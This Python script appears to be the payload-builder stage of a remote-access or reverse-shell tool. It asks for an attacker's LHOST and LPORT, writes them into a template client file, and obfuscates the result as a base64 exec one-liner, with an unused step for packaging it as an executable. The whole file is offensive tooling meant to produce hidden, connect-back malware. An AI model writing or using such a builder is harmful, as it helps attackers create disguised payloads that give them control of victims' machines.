import subprocess
from shutil import copyfile
import os
import socket
import base64
import sys
import pickle
import time

GREEN = '\33[32m'
RED = '\33[31m'
END = '\33[0m'
BOLD = '\33[1m'

#print(GREEN + BOLD + "\nThis isn't set up yet! Very soon... Please use the 'client.py' with the github instructions instead.\n" + END)

host = input(GREEN + BOLD + 'Set LHOST IP: ' + END)
port = input(GREEN + BOLD + 'Set LPORT: ' + END)
name = input(GREEN + BOLD + 'Enter the basename for output files: ' + END)

def createFile():
    try:
        global copiedFile
        print(GREEN + BOLD + '\nCreating python file...')
        time.sleep(1)
        exampleFile = os.getcwd() + '/source/example.py'
        copiedFile = os.getcwd() + '/output/' + name + '.py'
        copyfile(exampleFile, copiedFile)
        with open(copiedFile, 'r') as file:
            filedata = file.read()
        replaceHOST = "host = '" + host + "'"
        filedata = filedata.replace("host = ''", replaceHOST)
        with open(copiedFile, 'w') as file:
            file.write(filedata)

        with open(copiedFile, 'r') as file:
            filedata = file.read()
        replacePORT = "port = " + port
        filedata = filedata.replace("port = ''", replacePORT)
        with open(copiedFile, 'w') as file:
            file.write(filedata)
    except:
        print(RED + BOLD + "Couldn't create python file. Quitting...")
        sys.exit()

def encodedFile():
    global copiedFile
    print(GREEN + BOLD + 'Encoding file...')
    time.sleep(1)
    with open(copiedFile, 'rb') as file:
        for line in file:
            bencoded = base64.b64encode(file.read())
            encoded = str(bencoded)
    file.close()
    with open(copiedFile, "w+") as file:
        replaceEncoded = str("import base64,sys;exec(base64.b64decode(" + encoded + "))")
        file.truncate(0)
        file.write(replaceEncoded)
    file.close()

def pythonToExe():
    subprocess.call(['python3', 'setup.py'])

def done():
    print(GREEN + BOLD + '\nDone! Saved to output folder')

def main():
    createFile()
    encodedFile()

if __name__ == "__main__":
    main()
